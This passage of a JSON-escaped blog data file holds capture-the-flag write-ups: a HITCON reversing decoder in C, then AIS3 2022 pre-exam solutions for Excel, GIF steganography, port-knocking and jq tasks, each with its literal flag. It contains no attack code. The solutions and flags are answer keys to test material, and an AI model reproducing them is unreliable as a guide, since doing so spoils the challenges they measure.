a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)(a1 \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e123\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc5\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e result; \u003cspan style=\"color:#75715e\"\u003e// rax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (a1 \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e (a1 \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc6\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e173\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)a1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc7\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e result; \u003cspan style=\"color:#75715e\"\u003e// rax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e a1) \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e (a1 \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003edefaultdatahex \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;6360A5B9FFFC300A48BBFEFE322C0AD6E6FEFE322C0AD6BB4A4A322CFCFF0AFDBBFE2CB963D6B962D60A4F\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e datahex[\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e}, data[\u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(defaultdatahex) \u003cspan style=\"color:#a6e22e\"\u003estrcpy\u003c/span\u003e(datahex, defaultdatahex);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egets\u003c/span\u003e(datahex);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, count \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; datahex[i]; count\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e now[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e k \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; k \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e; k\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e, i\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e((datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;F\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e (datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;f\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e (datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e datahex[i] \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;9\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                now[k] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e datahex[i];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                k\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003esscanf\u003c/span\u003e(now, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%x\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003edata[count]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    func allfunc[\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {func0,func1,func2,func3,func4,func5,func6,func7};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; i \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e; i\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e k \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; k \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e43\u003c/span\u003e; k\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            data[k] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e allfunc[i](data[k]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hex: \u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; i \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e43\u003c/span\u003e; i\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%02x \u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e)data[i]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, data);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ehitcon{r3ally_re4lly_rea11y_normal_checker}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"other\"\u003eother\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@Vincent550102/ByMH8--Do\"\u003eother\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/hitconctf-2022-writeup/","title":"HITCON CTF 2021 Writeup"},{"content":"\u003ch1 id=\"score-board\"\u003eScore Board\u003c/h1\u003e\n\u003cp\u003e\u003cimg src=\"https://img.stoneapp.tech/t510599/ais3-2022/pre-exam/scoreboard.jpeg\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch2 id=\"welcome\"\u003eWelcome\u003c/h2\u003e\n\u003ch3 id=\"welcome-1\"\u003eWelcome\u003c/h3\u003e\n\u003ch4 id=\"題目\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168672745-6364d25f-e6b4-4251-a29b-7cc411ce8bfa.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168672792-4825a156-fd38-49e1-a414-b1dcba2e3d41.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{WTF did I just see the FLAG before CTF starts?}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"misc\"\u003eMisc\u003c/h2\u003e\n\u003ch3 id=\"excel\"\u003eExcel\u003c/h3\u003e\n\u003ch4 id=\"題目-1\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673095-490e4d69-2bf8-46b4-a8ce-468e4f4bf633.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673322-8f21320d-a696-45ab-a92f-a616c09139e6.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673375-2a2c9327-2e50-41cc-b0d2-63d1f2d4e95c.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673443-93e61a32-9206-430b-8c06-e29a62838e1e.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673507-f4504ec0-9a13-4b9b-8d45-99ccc72b137f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-1\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"gift-in-the-dream\"\u003eGift in the dream\u003c/h3\u003e\n\u003ch4 id=\"題目-2\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673698-16d3c232-db1c-4d69-a3c0-9970b5503f32.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-1\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003ebinwalk gift_in_the_dream.gif\u003c/code\u003e 一下發現啥都沒有。\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673798-46ea4b75-0057-40ed-84a7-8b8960af17c5.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003estrings gift_in_the_dream.gif\u003c/code\u003e 一下看到一堆重複出現的奇怪字串，應該是提示。\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673891-c278d846-63a4-4d04-9323-9f5107eaaf25.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168673950-126f0c6a-39d7-46ad-ac6d-00dc62b475fd.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"script\"\u003eScript\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eidentify -format \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s %T \\n\u0026#34;\u003c/span\u003e gift_in_the_dream.gif | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    printf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%02X\u0026#34;\u003c/span\u003e $a | xxd -r -p\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168674150-9425fae5-e7af-4ab2-8de2-65af515d8752.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-2\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"knock\"\u003eKnock\u003c/h3\u003e\n\u003ch4 id=\"題目-3\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168674246-cecba6af-39e8-43a6-97fe-0017f75890c3.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-2\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e原本以為是 Web 題，後來想想又好像不對，request 抓出來改用 curl 跑。\n\u003ccode\u003ecurl -X POST http://chals1.ais3.org:13337/ -d 'token=\u0026lt;token\u0026gt;'\u003c/code\u003e\n回傳的東西都是\n\u003ccode\u003e\u0026lt;p\u0026gt;I have knock on the \u0026lt;ip\u0026gt;\u0026lt;/p\u0026gt;\u003c/code\u003e\n於是馬上開 wireshark\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168674437-9b199fe4-bb49-49e0-9cd3-8220e096b498.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e果然，而且 dest port 明顯很像 ascii，應該接起來就 flag 了。\u003c/p\u003e\n\u003ch4 id=\"script-1\"\u003eScript\u003c/h4\u003e\n\u003ch5 id=\"iptables\"\u003eiptables\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -I INPUT \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e -i ais3pre2022 -p udp -s 10.113.203.111 -j LOG --log-prefix \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FORAIS3\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"rsyslog\"\u003ersyslog\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eif $msg contains \u0026#34;FORAIS3\u0026#34; then {\n    ^\u0026lt;script path\u0026gt;\n    stop\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"shell-script\"\u003eshell script\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/bin/bash\n\nsplitinspace()\n{\n    for a in $(cat $1)\n    do\n        echo $a\n    done\n}\n\nport=`echo $1 | splitinspace | grep DPT | cut -c 5- | sed \u0026#39;s/12//g\u0026#39;`\n\necho \u0026#34;$(cat /tmp/output)$(printf \u0026#34;%02X\\n\u0026#34; $(python3 -c \u0026#34;print(int(\u0026#39;$port\u0026#39;))\u0026#34;) | xxd -r -p)\u0026#34; \u0026gt; /tmp/output\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"執行結果\"\u003e執行結果\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eroot@jimmyGW:~# curl -X POST http://chals1.ais3.org:13337/ -d \u0026#39;token=\u0026lt;token\u0026gt;\u0026#39;\n\u0026lt;p\u0026gt;I have knock on the \u0026lt;ip\u0026gt;\u0026lt;/p\u0026gt;\nroot@jimmyGW:~# vi /tmp/output\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168674549-123dd8ae-46c0-4073-b4b2-d8d0d080bb79.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-3\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{kn0ckKNOCKknock}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"jeetqode\"\u003eJeetQode\u003c/h3\u003e\n\u003ch4 id=\"題目-4\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168675294-9bf6383f-02ff-4d65-ba3e-bb02aece6255.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-3\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e這題就 judge 而已，只是要用 jq，老實說 jq 我一直都有再用，但用這麼深還是第一次。\n到 \u003ca href=\"https://stedolan.github.io/jq/manual/\"\u003eJQ 的 document\u003c/a\u003e 找可以用的指令然後實現題目要求這樣而已(code 有點長因為沒規定長度所以沒特別壓)。\u003c/p\u003e\n\u003ch4 id=\"code\"\u003eCode\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e. == (explode | reverse | implode)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewalk(if type == \u0026quot;object\u0026quot; then (setpath([\u0026quot;tmp\u0026quot;]; .left) | setpath([\u0026quot;left\u0026quot;]; 